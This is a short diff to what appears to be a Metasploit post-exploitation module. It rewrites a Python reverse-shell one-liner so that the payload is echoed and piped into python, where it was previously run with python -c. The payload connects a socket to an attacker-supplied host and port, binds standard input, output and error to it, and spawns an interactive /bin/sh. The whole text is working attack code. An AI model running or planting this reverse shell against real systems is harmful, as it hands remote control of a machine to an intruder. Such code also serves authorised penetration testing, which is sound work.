@@ -170,9 +170,9 @@ class MetasploitModule < Msf::Post
   def python_session(lhost,lport)
     if cmd_exec("python -V") =~ /Python 2\.(\d)/
       print_status("Python reverse shell selected")
-      return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET," +
+      return "echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET," +
         "socket.SOCK_STREAM);s.connect((\"#{lhost}\",#{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);" +
-        "os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+        "os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' | python"
     else
       print_error("No scripting environment found for the selected type.")
       cmd =""
